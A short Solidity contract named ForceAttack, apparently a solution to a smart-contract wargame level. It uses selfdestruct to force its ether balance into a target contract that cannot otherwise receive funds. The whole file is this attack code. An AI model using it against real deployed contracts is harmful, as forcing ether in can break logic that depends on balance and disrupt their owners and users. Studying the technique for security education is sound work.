// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack{

    constructor() payable{}

    function attack(address target)external{
        selfdestruct(payable(target));
    }
}